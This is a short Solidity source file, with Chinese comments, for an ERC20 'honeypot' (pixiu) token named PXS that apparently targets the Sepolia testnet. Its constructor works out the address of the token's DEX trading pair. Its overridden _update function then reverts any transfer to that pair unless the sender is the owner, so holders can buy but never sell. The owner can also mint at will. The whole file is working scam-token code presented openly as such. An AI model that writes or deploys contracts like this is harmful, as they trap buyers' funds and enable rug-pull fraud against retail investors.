// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

// 极简貔貅ERC20代币，只能买，不能卖
contract HoneyPotSepolia is ERC20, Ownable {
    address public pair;
    // 构造函数：初始化代币名称和代号
    constructor() ERC20("PXS", "PXS") Ownable(msg.sender){
        address factory = 0xB7f907f7A9eBC822a80BD25E224be42Ce0A698A0; 
        address tokenA = 0xd6a9cec6c2E8a71E556F721776e158e1Bb9eF5a9;
        address tokenB = 0xfFf9976782d46CC05630D1f6eBAb18b2324d6B14; 
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA); //将tokenA和tokenB按大小排序
        bytes32 salt = keccak256(abi.encodePacked(token0, token1));
        bytes32 initCodeHash = 0xe18a34eb0e04b04f7a0ac29a6e80748dca96319b42c54d679cb821dca90c6303;
        // calculate pair address
        pair = address(uint160(uint(keccak256(abi.encodePacked(
          hex"ff",
          factory,
          salt,
          initCodeHash
        )))));
    }
    
    /**
     * 铸造函数，只有合约所有者可以调用
     */
    function mint(address to, uint amount) public onlyOwner {
        _mint(to, amount);
    }

  /**
     * @dev See {ERC20-_update}.
     * 貔貅函数：只有合约拥有者可以卖出
    */
    function _update(
      address from,
      address to,
      uint256 amount
  ) internal virtual override  {
     if(to == pair){
        require(from == owner(), "Can not Transfer");
      }
      super._update(from, to, amount);
  }
}